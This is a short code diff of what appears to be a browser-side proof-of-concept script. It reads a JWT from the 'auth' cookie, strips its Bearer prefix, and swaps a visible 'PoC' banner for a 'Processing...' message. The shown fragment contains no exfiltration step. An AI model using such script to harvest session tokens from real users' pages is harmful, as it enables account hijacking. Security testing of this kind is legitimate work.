@@ -1,5 +1,6 @@
 // Step 1: Extract the JWT from the "auth" cookie and save it in a variable
-document.write = '<h1>PoC</h1>'
+document.write('<h1>Processing...</h1>');
+
 const cookieValue = document.cookie.split('; ').find(row => row.startsWith('auth=')).split('=')[1];
 const jwt = decodeURIComponent(cookieValue).replace('Bearer%20', '');
 
